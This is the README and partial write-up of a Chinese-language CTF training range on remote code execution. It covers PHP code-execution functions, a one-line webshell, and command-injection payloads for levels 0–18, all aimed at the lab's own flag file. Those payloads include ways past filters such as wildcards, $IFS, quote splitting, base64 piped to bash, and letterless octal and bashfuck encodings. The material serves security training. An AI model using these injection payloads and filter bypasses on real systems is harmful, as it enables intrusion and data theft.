# RCE-labs

靶场内容(还将继续持续更新)：  

| 关卡号  | 类别                         | 内容                                             |
|---------|------------------------------|--------------------------------------------------|
| Level 0 | 基础篇            | 代码执行&命令执行                                |
| Level 1 | 基础篇          | 一句话木马和代码执行                             |
| Level 2 | 基础篇          | PHP代码执行函数                                  |
| Level 3 | 基础篇                      | 命令执行                                         |
| Level 4 | 命令执行      | SHELL 运算符                          |
| Level 5 | 命令执行      | 黑名单式过滤                              |
| Level 6 | 命令执行      | 通配符匹配绕过                                   |
| Level 7 | 命令执行      | 空格过滤                                  |
| Level 8 | 命令执行      | 文件描述和重定向                                        |
| Level 9 | 命令执行      | 无字母命令执行_八进制转义                           |
| Level 10| 命令执行      | 无字母命令执行_二进制整数替换                |
| Level 11| 命令执行      | 无字母命令执行_整数1的特殊变量替换                        |
| Level 12| 命令执行      | 无字母命令执行_整数0的特殊变量替换                         |
| Level 13| 命令执行      | 无字母命令执行_特殊扩展替换任意数字                          |
| Level 14| 命令执行                     | 7字符RCE                                         |
| Level 15| 命令执行                     | 5字符RCE                                         |
| Level 16| 命令执行                     | 4字符RCE                                         |
| Level 17| 命令执行   | PHP命令执行函数                                  |
| Level 18| 命令执行   | 环境变量注入                                     |
| Level 19| RCE类型             | 文件写入导致的RCE                                |
| Level 20| RCE类型             | 文件上传导致的RCE                                |
| Level 21| RCE类型             | 文件包含导致的RCE                                |
| Level 22| PHP 特性                      | 动态调用                                         |
| Level 23| PHP 特性                      | 自增                                             |
| Level 24| PHP 特性                      | 无参命令执行                                     |
| Level 25| PHP 特性                      | 取反绕过                                         |
| Level 26| PHP 特性                      | 无字母数字的代码执行                             |
| Level 27| RCE类型                          | 模板注入导致的RCE                                |







## WriteUp

后面慢慢补（）

### Level 0 : 代码执行&命令执行 

打开题目即可得Flag，没有什么可以说的，作为第一个关卡主要是用于理解两者的区别。

**「任意代码执行(Arbitrary Code Execution,ACE)」** 是指攻击者在目标计算机或目标进程中运行攻击者选择的任何命令或代码的能力，这是一个广泛的概念，它涵盖了任何类型的代码运行过程，不仅包括系统层面的脚本或程序，也包括应用程序内部的函数或方法调用。

在此基础上我们将通过网络触发任意代码执行的能力通常称为 远程代码执行 **「远程代码执行(RCE,Remote Code Execution,RCE)」**。

**「命令执行(Command Execution)」** 通常指的是在操作系统层面上执行预定义的指令或脚本。这些命令最终的指向通常是系统命令，如Windows中的CMD命令或Linux中的Shell命令，这在语言中可以体现为一些特定的函数或者方法调用，如PHP中的`shell_exec()`函数或Python中的`os.system()`函数。

**「代码执行(Code Execution)」** 同我们最开始说到的任意代码执行，在语言中可以体现为一些函数或者方法调用，如PHP中的`eval()`函数或Python中的`exec()`函数。

在该题目中：

```php
代码执行：eval("include('flag.php');echo 'This will get the flag by eval PHP code: '.\$flag;");

命令执行：system("echo 'This will get the flag by Linux bash command - cat /flag: ';cat /flag");
```

### Level 1 : 一句话木马和代码执行 

概念已经在题目引导部分做出解释：

> 「代码执行(Code Execution)」 在某个语言中，通过一些方式(通常为函数或者方法调用)执行该语言的任意代码的行为，如PHP中的`eval()`函数或Python中的`exec()`函数。
> 当漏洞入口点可以执行任意代码时，我们称其为代码执行漏洞 —— 这种漏洞包含了通过语言中对接系统命令的函数来执行系统命令的情况，比如 eval("system('cat /etc/passwd')";); 也被归为代码执行漏洞。

题目给了一个常见的一句话木马，其需要传递的参数为 a ，使用POST的方法传递。

由于题目包含了 get_flag.php 所以我们直接在执行点输出flag就行：

**POST**：`a=echo $flag;`

当然，一句话木马支持Webshell管理工具进行链接，通常情况下链接密码为提交的参数(蚁剑)。

### Level 2 : PHP代码执行函数 

首先通过发送 GET：/?action= 去随机的获取一个函数，然后通过 GET：/?action=submit + POST：content=<函数参数>的方法完成题目。

通过源码可以看到最后我们的提交会组合为一个函数去调用： `eval(funciton(content))`

对应函数输出flag的方式可以参考下面的表格：

#### PHP 代码执行相关函数

| 函数                                                         | 说明                                                         | 示例代码                                                     |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| `${}`                                                        | 用于复杂的变量解析，通常在字符串内用来解析变量或表达式。可以配合 `eval` 或其他动态执行代码的功能，用于间接执行代码。 | `eval('${flag}');`                                           |
| [`eval()`](https://www.php.net/manual/zh/function.eval.php)  | 用于执行一个字符串作为 PHP 代码。可以执行任何有效的 PHP 代码片段。没有返回值，除非在执行的代码中明确返回。 | `eval('echo $flag;');`                                       |
| [`assert()`](https://www.php.net/manual/zh/function.assert.php) | 测试表达式是否为真。PHP 8.0.0 之前，如果 `assertion` 是字符串，将解释为 PHP 代码并通过 `eval()` 执行。<br />**PHP 8.0.0 后移除该功能。** | `assert(print_r($flag));`                                    |
| [`call_user_func()`](https://www.php.net/manual/zh/function.call-user-func.php) | 用于调用回调函数，可以传递多个参数给回调函数，返回回调函数的返回值。适用于动态函数调用。 | `call_user_func('print_r', $flag);`                          |
| [`create_function()`](https://www.php.net/manual/zh/function.create-function.php) | 创建匿名函数，接受两个字符串参数：参数列表和函数体。返回一个匿名函数的引用。<br />**自 PHP 7.2.0 起被*废弃*，并自 PHP 8.0.0 起被*移除*。** | `create_function('$a', 'echo $flag;')($a);`                  |
| [`array_map()`](https://www.php.net/manual/zh/function.array-map.php) | 将回调函数应用于数组的每个元素，返回一个新数组。适用于转换或处理数组元素。 | `array_map(print_r($flag), $a);`                             |
| [`call_user_func_array()`](https://www.php.net/manual/zh/function.call-user-func-array.php) | 调用回调函数，并将参数作为数组传递。适用于动态参数数量的函数调用。 | `call_user_func_array(print_r($flag), array());`             |
| [`usort()`](https://www.php.net/manual/zh/function.usort.php) | 对数组进行自定义排序，接受数组和比较函数作为参数。适用于根据用户定义的规则排序数组元素。 | `usort($a,print_r($flag));`                                  |
| [`array_filter()`](https://www.php.net/manual/zh/function.array-filter.php) | 过滤数组元素，如果提供回调函数，仅包含回调返回真值的元素；否则，移除所有等同于false的元素。适用于基于条件移除数组中的元素。 | `array_filter($a,print_r($flag));`                           |
| [`array_reduce()`](https://www.php.net/manual/zh/function.array-reduce.php) | 迭代一个数组，通过回调函数将数组的元素逐一减少到单一值。接受数组、回调函数和可选的初始值。 | `array_reduce($a,print_r($flag));`                           |
| [`preg_replace()`](https://www.php.net/manual/zh/function.preg-replace.php) | 执行正则表达式的搜索和替换。可以是单个字符串或数组。适用于基于模式匹配修改文本内容。<br />**依赖 /e 模式，该模式自 PHP7.3 起被取消。** | `preg_replace('/(.*)/ei', 'strtolower("\\1")', ${print_r($flag)});` |
| [`ob_start()`](https://www.php.net/manual/zh/function.ob-start.php) | ob_start — 打开输出控制缓冲,可选回调函数作为参数来处理缓冲区内容。 | `ob_start(print_r($flag));`                                  |

推荐你在本地进行调试以熟悉对应函数的使用方法。

### Level 3 : 命令执行 

同之前的 Level 1 : 一句话木马和代码执行  关卡一致，只不过这里的入口换成了system.

system() 函数会通过sh软连接执行你输入的系统命令。

**POST**：`a=cat /flag`

### Level 4 : 命令执行 - SHELL 运算符 

源码很简单：`system("ping -c 1 $ip");`

首先Shell的运算符可以参考下面的表格：

| 运算符               | 说明                                                         | 示例代码                                                     |
| -------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| `&&`（逻辑与运算符） | AND操作 只有当第一个命令 `cmd_1` 执行成功（返回值为 0）时，才会执行第二个命令 `cmd_2`。 | `mkdir new_folder && cd new_folder` （只有在新建文件夹成功后才进入该文件夹） |
| `||`（逻辑或运算符） | OR操作 只有当第一个命令 `cmd_1` 执行失败（返回值不为 0）时，才会执行第二个命令 `cmd_2`。 | `mkdir new_folder ||echo "Folder exists"` （如果创建文件夹失败，则输出 "Folder exists"） |
| `&`（后台运行符）    | 将命令 `cmd_1` 放到后台执行，Shell 立即执行 `cmd_2`，两个命令并行执行。 | `sleep 10 & echo "This will run immediately."`               |
| `;`（命令分隔符）    | 无论前一个命令 `cmd_1` 是否成功，都会执行下一个命令 `cmd_2`。这允许将命令堆叠在一起。命令会依次执行。 | `echo "Hello" & echo "World"` （先输出 "Hello"，再输出 "World"） |

所以只需要在输入的时候 在后面利用连接符拼接我们想要执行的命令即可：

GET 下面几种均可：

```bash
?ip=1.1.1.1&&cat /flag

?ip=||cat /flag

?ip=;cat /flag

?ip=&cat /flag #&需要URL编码
```

扩展：其他Shell符号：

| 操作符                                                       | 结果                                                         | 示例                                                         |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| `command1 > command2` <br />`command1 < command2` <br />`command1 >> command2` | 这些操作符是重定向操作符。它们用于重定向输入或输出。         | `echo "Hello" > output.txt` （将 "Hello" 写入到 output.txt 文件） <br />`cat < input.txt` （读取 input.txt 的内容并在终端显示）<br /> `echo "Hello" >> output.txt` （将 "Hello" 追加到 output.txt 文件中） |
| `` `command2` ``                                             | 反引号将一个单独的命令封装在原始命令处理的数据中。           | echo "Today is \`date\`"（将日期命令的输出嵌入到 "Today is" 之后） |
| `command1 | command2`                                        | 管道可用于将多个命令链接起来。一个命令的输出会被重定向到下一个命令中。 | `ls -l | grep ".txt"` （列出所有以 .txt 结尾的文件）         |
| `$(command2)`                                                | $ 符号执行括号内的命令。                                     | `echo "Today is $(date)"` （将日期命令的输出嵌入到 "Today is" 之后） |
| `- command`                                                  | 短横线用于向目标命令添加其他操作。                           | `ls -l -h` （列出文件时显示文件大小的可读格式）              |

### Level 5 - 8: 命令执行 - 终端中的功能/特殊字符

题目引导给出来了大部分内容了：

```
分割符：
换行符 %0a
回车符 %0d


%09 —— TAB制表符的URL编码


$9 —— 当前系统shell进程的第九个参数的持有者，它始终为空字符串,但该条目在容器中测试体现如下：
bash-5.1# echo $9 | base64
Cg==(URLen:%0A) —— 输出为回车符号

${<!-- -->IFS} —— 加一个{}固定了变量名- 同理在后面加个$可以起到截断的作用
<
<> —— 该方法无法通过system函数实现。但在终端可以复现。

命令终止：
%00 —— NULL字符
```

#### level 5 - 黑名单式过滤

通过黑名单匹配的方式过滤了flag。

**空字符：**

在Shell中，单/双引号 "/' 可以用来定义一个空字符串或保护包含空格或特殊字符的字符串。
例如：echo "\$"a 会输出 $a，而 echo $a 会输出变量a的值，当只有""则表示空字符串，Shell会忽略它。

```
?cmd=cat /f''lag
?cmd=cat /f'l'ag
```

**通配符：**

| 通配符 | 功能说明                                                 | 示例              | 用途                                             |
| ------ | -------------------------------------------------------- | ----------------- | ------------------------------------------------ |
| `*`    | 匹配**零个或多个**字符                                   | `*.txt`           | 匹配所有以 `.txt` 结尾的文件                     |
| `?`    | 匹配**单个字符**                                         | `file?.txt`       | 匹配 `file1.txt`, `file2.txt` 等单个字符的文件名 |
| `[]`   | 匹配方括号内的**任意一个字符**                           | `file[1-3].txt`   | 匹配 `file1.txt`, `file2.txt`, `file3.txt`       |
| `[^]`  | 匹配**不在方括号内**的字符                               | `file[^a-c].txt`  | 匹配不包含 `a` 到 `c` 之间字符的文件             |
| `{}`   | 匹配大括号内的**任意一个字符串**，使用逗号分隔           | `file{1,2,3}.txt` | 匹配 `file1.txt`, `file2.txt`, `file3.txt`       |
| `~`    | 表示当前用户的**主目录**                                 | `~/Documents`     | 访问主目录下的 `Documents` 文件夹                |
| `!`    | 表示**取反**，在一些条件测试或模式匹配中使用             | `ls !(*.txt)`     | 列出所有不是 `.txt` 结尾的文件                   |
| `\`    | **转义字符**，取消通配符的特殊意义，使其作为普通字符处理 | `file\*.txt`      | 匹配文件名为 `file*.txt` 的文件                  |

```
?cmd=cat /f*
```

**赋值与拼接：**

```
<@URLe>a=c;b=at;c=fla;d=g;$a$b /$c$d<@URLe>
?cmd=a%3Dc%3Bb%3Dat%3Bc%3Dfla%3Bd%3Dg%3B%24a%24b%20%2F%24c%24d
```

**反斜杠：**

```
?cmd=ca\t /fla\g
```

**特殊变量：**

| 变量           | 含义                                       | 示例输出                          |
| -------------- | ------------------------------------------ | --------------------------------- |
| `${#}`         | 传递给脚本或函数的参数个数                 | `0`（参数为空时）                 |
| `${?}`         | 上一个命令的退出状态                       | `0`（正常退出）或 `1`（异常退出） |
| `${_}`         | 上一个命令的最后一个参数                   | 上一个命令的最后一个参数值        |
| `${0}`         | 当前脚本或 shell 的名字                    | `bash` 或脚本名                   |
| `${1} 到 ${9}` | 传递给脚本或函数的第 1 到第 9 个参数       | 第 1 到第 9 个参数值              |
| `${@}`         | 传递给脚本或函数的所有参数（以列表形式）   | 所有参数值                        |
| `${*}`         | 传递给脚本或函数的所有参数（以字符串形式） | 所有参数作为单个字符串            |
| `${$}`         | 当前 shell 的进程 ID (PID)                 | 进程 ID 值                        |
| `${!}`         | 上一个后台运行的进程的进程 ID (PID)        | 后台进程的 PID                    |
| `${-}`         | 当前 shell 的选项标志                      | `hB`（表示 shell 选项标志）       |

```
?cmd=ca$1t /fl$@ag

?cmd=ca$1t /fl$1ag

?cmd=ca$1t /fl$2ag
```

**编码 / 进制：**

```
cat "$(echo 'L2ZsYWc=' | base64 -d)"
`echo "Y2F0IC9mbGFn"|base64 -d`
echo "Y2F0IC9mbGFn"|base64 -d|bash

echo -n 636174202f666c6167 | xxd -r -p | bash # 十六进制
$(printf "\143\141\164\040\057\146\154\141\147\012")# 八进制（or bashfuck）
```

#### level 6 - 通配符

在前面我们有介绍各类通配符，有说到 ? 可以进行匹配执行命令

可以尝试在Linux终端中做下面的几个实验，使用echo方法输出?匹配的字符串：

```
bash-5.1# echo /???/?????? 
/bin/base64 /bin/getopt /bin/gunzip /bin/ionice /bin/iostat /bin/ipcalc /bin/mktemp /bin/mpstat /bin/umount /bin/usleep /dev/mqueue /dev/random /dev/stderr /dev/stdout /etc/conf.d /etc/group- /etc/init.d /etc/passwd /etc/shadow /etc/shells /etc/ssl1.1 /sys/kernel /sys/module

bash-5.1# echo /???/???
/bin/ash /bin/cat /bin/pwd /bin/rev /bin/sed /bin/tar /dev/pts /dev/shm /dev/tty /etc/apk /etc/opt /etc/ssl /lib/apk /sys/bus /sys/dev /usr/bin /usr/lib /usr/src /var/lib /var/log /var/opt /var/run /var/tmp /var/www
```

观察正则

```
[b-zA-Z_@#%^&*:{}\-\+<>\"|`;\[\]]
```

可以发现，我们可以使用一个字母 a和数字，此时：

```
bash-5.1# echo /???/?a?
/bin/cat /bin/tar
bash-5.1# echo /???/?a? /??a?
/bin/cat /bin/tar /flag
bash-5.1# echo /???/?a??64
/bin/base64
bash-5.1# echo /???/?a??64 /??a?
/bin/base64 /flag
```

所以本题可用的payload：

```
/???/?a??64 /??a? # 使用 /bin/base64 /flag
/bin/?a? /??a? # 使用 /bin/cat /flag
```

**扩展 - 读文件的程序**

| 命令      | 描述                                                         |
| --------- | ------------------------------------------------------------ |
| `cat`     | 从第一行开始显示内容，并将所有内容输出                       |
| `tac`     | 从最后一行倒序显示内容，并将所有内容输出                     |
| `more`    | 根据窗口大小，一页一页地显示文件内容                         |
| `less`    | 根据窗口大小，显示文件内容，可以使用 [pg dn] 和 [pg up] 翻页 |
| `head`    | 用于显示文件的头几行                                         |
| `tail`    | 用于显示文件的尾几行                                         |
| `nl`      | 类似于 `cat -n`，显示时输出行号                              |
| `tailf`   | 类似于 `tail -f`，实时显示文件尾部内容                       |
| `sort`    | 读取并排序文件内容                                           |
| `od`      | 以二进制的方式读取文件内容                                   |
| `vi`      | 一种编辑器，能查看文件内容                                   |
| `vim`     | 一种编辑器，能查看文件内容                                   |
| `uniq`    | 过滤重复行，能查看文件内容                                   |
| `file -f` | 显示文件类型信息，若出错会报告具体内容                       |

#### level 7 - 空格过滤

在 L5 的基础上，屏蔽了空格。

**$IFS**

在终端环境下 空格 被视为一个命令分隔符，本质上由 \$IFS 变量控制，而 $IFS 的默认值是空格，你可以在终端中尝试 `echo $IFS | base64` 可以看到空格的base64编码。

```
?cmd=cat${IFS}/fl""ag

?cmd=cat$IFS/fl""ag

?cmd=cat%09/fl""ag
```

**重定向**

```
?cmd=cat</fl""ag
```

**{}**

该语法只在 bash 中生效。

```
{cat,/f'l'ag}
```

**进制**

```
X=$'cat\x20/flag'&&$X
```

**扩展：过滤 /**

```
${HOME:0:1}来替代"/"：
cat /flag ---->>> cat ${HOME:0:1}flag

$(echo . | tr '!-0' '"-1')来替代"/"：
cat $(echo . | tr '!-0' '"-1')flag
```

#### Level 8 : 命令执行 - 文件描述和重定向

在Linux中文件描述符(File Descriptor)是用于标识和访问打开文件或输入/输出设备的整数值，每个打开的文件或设备都会被分配一个唯一的文件描述符，Linux 中的文件描述符使用非负整数值来表示其中特定的文件描述符有以下含义

- 标准输入(stdin)：文件描述符为0，通常关联着终端键盘输入
- 标准输出(stdout)：文件描述符为1，通常关联着终端屏幕输出
- 标准错误(stderr)：文件描述符为2，通常关联着终端屏幕输出

平时我们使用的"<"和">"其实就相当于是使用"0<"和"1>"，下面是几种常见的使用示例：

| 符号   | 示例                          | 解释                                                         |
| ------ | ----------------------------- | ------------------------------------------------------------ |
| `>`    | `echo "Hello" > file.txt`     | 将 `echo` 的输出重定向到 `file.txt` 文件                     |
| `<`    | `wc -l < file.txt`            | 将 `file.txt` 作为 `wc` 命令的输入                           |
| `>>`   | `echo "World" >> file.txt`    | 将 `echo` 的输出以追加方式重定向到 `file.txt`                |
| `<<`   | `cat << EOF`                  | 将输入的文本作为 `cat` 命令的输入，直到遇到 `EOF` 结束       |
| `<>`   | `cat <> file.txt`             | 以读写模式打开 `file.txt` 并将其内容作为输入                 |
| `>|`   | `echo "Override" >| file.txt` | 强制覆盖写入到 `file.txt` 文件，即使它具有写保护             |
| `: >`  | `: > file.txt`                | 将 `file.txt` 截断为0长度，或创建空文件                      |
| `>&n`  | `ls >&2`                      | 将 `ls` 的标准输出和错误输出重定向到文件描述符 `n` (如 `2` 为标准错误输出) |
| `m>&n` | `exec 3>&1`                   | 将文件描述符 `3` 重定向到描述符 `1`，即输出重定向到标准输出  |
| `>&-`  | `exec >&-`                    | 关闭标准输出                                                 |
| `<&n`  | `exec <&0`                    | 输入来自文件描述符 `0` (标准输入)                            |
| `m<&n` | `exec 3<&0`                   | 将文件描述符 `3` 重定向到描述符 `0` (标准输入)               |
| `<&-`  | `exec <&-`                    | 关闭标准输入文件描述符                                       |
| `<&n-` | `exec <&0-`                   | 重定向并关闭文件描述符 `n` (标准输入)                        |
| `>&n-` | `exec >&1-`                   | 重定向并关闭文件描述符 `n` (标准输出)                        |

### Level 9 - 13 - 基于Bash的无字母命令执行

这一部分的核心原理在前面我们已经提过，那就是bash能解析八进制状态的字母，即通过 `$'\xxx'` 的方式执行命令。

题目目前已经有成熟脚本：https://probiusofficial.github.io/bashFuck/ 但这一章节我会尽量给你解释清楚其中的原理。

在开始前，我依旧要强调这是一个bash特性：

> 使用 `echo $0` 的方式获取当前运行的脚本名称即可查看自己的终端类型：
>
> ```
> root@Hello-CTF:echo $0
> bash # bash / dash
> ```
>
> 如果你直接与容器交互大概率你能得到一个bash的结果，但是当**我们使用system函数时，这其实会由sh去执行**，所以如果我们使用system去执行上述命令，大概率会得到：
>
> ```
> # echo $0
> sh
> ```
>
> 但其实 sh 也是外包，通常它只是一个软连接，并不是真的有一个shell叫sh，要查看它最终的定向，我们可以使用 `ls -l /bin/sh` 使用 -l 参数列出：
>
> ```
> root@Hello-CTF:ls -l /bin/sh
> lrwxrwxrwx    1 root     root            12 Mar 16  2022 /bin/sh -> /bin/busybox
> ```
>
> 这个是我们靶场使用的镜像 `php:7.3-fpm-alpine`  sh 默认的指向，如果你有一些基础的Docker知识，阅读Dockerfile你会发现在bash无字母命令执行的这几关，我们多添加了这一行：
>
> ```
> #修改指向
> RUN ln -sf /bin/bash /bin/sh
> ```
>
> 当sh指向busybox时，我们讲无法使用后面会讲到的变换特性，这也是该方法的一大局限性。
>
> 一般情况下在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash；

#### Level 9 - 八进制

如`ls` 可以通过`$'\154\163'` 的方式进行执行。

```
root@Hello-CTF:/home# $'\154\163'
Challenge  Hello-CTF_labs  PHPSerialize-labs  PHPinclude-labs  RCE-labs
```

你可以尝试去dash中执行，你会发现dash是无法解析他们的：

```
# $'\154\163'
dash: 1: $\154\163: not found
```

若 sh 的软连接指向 dash 那么用system函数也类似：

```
# $'\154\163'
sh: 1: $\154\163: not found
```

但是这种方法的缺陷就是无法一连串的指向带参命令，只能拆分开来：

```
bash-5.1# $'\143\141\164\40\57\146\154\141\147'
bash: cat /flag: No such file or directory

bash-5.1# $'\143\141\164' $'\57\146\154\141\147'
flag{TEST_Dynamic_FLAG}
```

不过好在关卡并没有禁用空格，你可以将他们写开：

A+空格+B：

```
?cmd=$'\143\141\164' $'\57\146\154\141\147'
```

当然如果禁用了空格，根据它允许字符集，你也可以使用:

```
?cmd=$'\143\141\164'<$'\57\146\154\141\147'
```

#### Level 10 - 二进制整数替换

引入了新的特性 —— 在bash中，支持二进制的表示整数的形式：`$((2#binary))`。

通过这一特性，我们可以使用二进制来构造八进制的整数形式 —— 注意这里并不是讲八进制转换为二进制，这里其实是用二进制来替换八进制中的每一位数字，如果你能读懂一些py或者js的源码，我们的转换器在这里基于下面的语句实现：

```js
function getOct(c) {
    return c.charCodeAt(0).toString(8); // 将字符的ASCII值转换为八进制字符串
}
binaryStr=parseInt(getOct(c), 10).toString(2); // 将八进制以十进制的方式转换为二进制
```

是否觉得在二进制中，`$((2#binary))` 中的2有些碍眼？我们可以通过左移运算 1<<1 的方式替换2，对此每一个八进制转义字符都可以被替换为如下形式：

```
$(($((1<<1))#binaryStr))
```

再在外面套上八进制的转义：

```
$\'\\$(($((1<<1))#binaryStr))'
```

但你如果直接实验，会发现这是行不通的，终端解析到八进制转义之后就不再继续解析了。

```
root@Hello-CTF:/home# $\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'
$'\154\163': command not found
```

具体细节可以阅读：https://github.com/ProbiusOfficial/bashFuck 这里不再赘述，我们引入一个 Here string 的语法让终端在做一次解析即可：

```
$0 为当前脚本名称，在bash终端中 与 bash 字符串等价。
比如下面为 ls 命令：
$0<<<$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'

如果要执行带参命令，则需要两次解析：
$0<<<$0\<\<\<\$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'
```

这里用到了一些bash中的特殊变量（非字母）：

| 变量           | 含义                                       | 示例输出                          |
| -------------- | ------------------------------------------ | --------------------------------- |
| `${#}`         | 传递给脚本或函数的参数个数                 | `0`（参数为空时）                 |
| `${?}`         | 上一个命令的退出状态                       | `0`（正常退出）或 `1`（异常退出） |
| `${_}`         | 上一个命令的最后一个参数                   | 上一个命令的最后一个参数值        |
| `${0}`         | 当前脚本或 shell 的名字                    | `bash` 或脚本名                   |
| `${1} 到 ${9}` | 传递给脚本或函数的第 1 到第 9 个参数       | 第 1 到第 9 个参数值              |
| `${@}`         | 传递给脚本或函数的所有参数（以列表形式）   | 所有参数值                        |
| `${*}`         | 传递给脚本或函数的所有参数（以字符串形式） | 所有参数作为单个字符串            |
| `${$}`         | 当前 shell 的进程 ID (PID)                 | 进程 ID 值                        |
| `${!}`         | 上一个后台运行的进程的进程 ID (PID)        | 后台进程的 PID                    |
| `${-}`         | 当前 shell 的选项标志                      | `hB`（表示 shell 选项标志）       |

你可以使用生成器中的 `Charset (9) : # $ ' ( ) 0 1 < \`，或者下面的Python：

```python
print('$0<<<$0\\<\\<\\<\\$\\\'' + ''.join(f'\\\\$(($((1<<1))#{bin(int(oct(ord(c))[2:]))[2:]}))' for c in 'ls') + '\\\'')
```

#### Level 11 - 数字1的特殊变量替换

**替换 0 1：**

我们知道 `${#}`代表传递给当前脚本的参数个数，但我们是直接和sh交互命令，sh软连接的指向的 bash ，bash直接运行时是没有参数的：

```
root@Hello-CTF:/home# echo ${#}
0
root@Hello-CTF:/home# echo $#
0
```

**间接扩展特性**——`${#xxx}`，它用于表示变量 xxx 存储的字符串长度：

```
bash-5.1# str="abcdefg"
bash-5.1# echo ${#str}
7
```

将两者结合到一起可以写成组合 `${##}`  基于bash扩展运算的优先级，第一个#是功能作用第二个#作为变量名称 - **0作为字符串长度为1**.

```
bash-5.1# echo ${##}
1
```

所以对于 ls 命令：

```
→ $0<<<$0\<\<\<\$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'

→ $0<<<$0\<\<\<\$\'\\$(($((${##}<<${##}))#${##}00${##}${##}0${##}0))\\$(($((${##}<<${##}))#${##}0${##}000${##}${##}))\'
```

#### Level 12 - 数字0的特殊变量替换

**间接扩展特性**——`${!xxx}`，它表示用xxx的值作为另一个变量的名字，然后取出那个变量的值:

```
如果a=0，b=1，c=2，那么 ${!a} 就相当于 $0 ， ${!b} 就相当于 $1 ， ${!c} 就相当于 $2 
bash-5.1# a=0
bash-5.1# echo ${!a}
bash
```

利用这个特性可以进一步替换：

```
→ ${!#}<<<${!#}\<\<\<\$\'\\$(($((${##}<<${##}))#${##}${#}${#}${##}${##}${#}${##}${#}))\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${#}${##}${##}))\'
```

但是这在PHP中并没有实现，看起来是因为sh的原因，但可以直接在bash中使用。

```
sh-5.1# echo $0
sh
sh-5.1# echo $#
0
sh-5.1# echo ${##}
1
sh-5.1# echo ${!#}

sh-5.1# echo ${!#} | base64
Cg==
sh-5.1# echo $?
0
sh-5.1# echo ${!?}
sh: !: parameter not set
```

所以该关卡我们使用Python来构建虚拟终端，使其直接与bash交互，那么对应的替换命令就能正常使用。

#### Level 13 - 特殊扩展替换任意数字

在前面我们用的 `$((2#binary))` 的方式来引入二进制，如果`#`被禁用呢？

在不使用`$((2#binary))`特性的情况下，我们还可以通过多个-1的叠加再取反去构造任意数字，于是就有了：

```
oct_list = [  # 构造数字 0-7 以便于后续八进制形式的构造
    '$(())',  # 0
    '$((~$(($((~$(())))$((~$(())))))))',  # 1
    '$((~$(($((~$(())))$((~$(())))$((~$(())))))))',  # 2
    '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 3
    '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 4
    '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 5
    '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 6
    '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 7
]
```

不过由于sh不支持一些特性 —— 如 `${!?}`

所以仅能通过定义一个`__=$(())`的方式将`__`变量的值设置为0，然后通过`${!__}`的形式拿到`sh`字符。两条命令间通过`&&`进行连接。至于为什么是两个下划线，是因为bash的变量命名规范是以下划线或者英文字母开头，可以包含下划线和英文字母数字。

所以对于 ls 命令：

```
__=$(())&&${!__}<<<${!__}\<\<\<\$\'\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\'
```

### Level 14 - 16

#### Level 14 - 长度限制_7字符RCE

```bash
>a    #虽然没有输入但是会创建a这个文件
ls -t    #ls基于基于事件排序（从晚到早）
sh a    #sh会把a里面的每行内容当作命令来执行
使用|进行命令拼接    #l\ s    =    ls
base64    #使用base64编码避免特殊字符
```

#### Level 15 - 长度限制_5字符RCE

idea from ：[【HITCON 2017 - babyfirst-revenge】](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge)

#### Level 16 - 长度限制_4字符RCE

idea from ：[【HITCON 2017 - BabyFirst-Revenge-v2】](https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#babyfirst-revenge-v2)

### Level 17 : 命令执行 - PHP命令执行函数 

| 函数                                                         | 说明                                                         | 示例代码                                                     |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| [`system()`](https://www.php.net/manual/zh/function.system.php) | `system()` 函数用于在系统权限允许的情况下执行系统命令（Windows 和 Linux 系统均可执行）。 | `system('cat /etc/passwd');`                                 |
| [`exec()`](https://www.php.net/manual/zh/function.exec.php)  | `exec()` 函数可以执行系统命令，但不会直接输出结果，而是将结果保存到数组中。 | `exec('cat /etc/passwd', $result); print_r($result);`        |
| [`shell_exec()`](https://www.php.net/manual/zh/function.shell-exec.php) | `shell_exec()` 函数执行系统命令，但返回一个字符串类型的变量来存储系统命令的执行结果。 | `echo shell_exec('cat /etc/passwd');`                        |
| [`passthru()`](https://www.php.net/manual/zh/function.passthru.php) | `passthru()` 函数执行系统命令并将执行结果输出到页面中，支持二进制数据。 | `passthru('cat /etc/passwd');`                               |
| [`popen()`](https://www.php.net/manual/zh/function.popen.php) | `popen()` 函数执行系统命令，但返回一个资源类型的变量，需要配合 `fread()` 函数读取结果。 | `$result = popen('cat /etc/passwd', 'r'); echo fread($result, 100);` |
| [反引号 \`\`](https://www.php.net/manual/zh/language.operators.execution.php) | 反引号用于执行系统命令，返回一个字符串类型的变量来存储命令的执行结果。**注意：关闭了 [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php) 时反引号运算符是无效的** | echo \`cat /etc/passwd`                                      |

### Level 18 : 命令执行 - 环境变量注入 

[【我是如何利用环境变量注入执行任意命令】](https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html)

```
foreach($_REQUEST['a'] as $key => $val) {
    putenv("{$key}={$val}");
}
=> a[key] = val
```

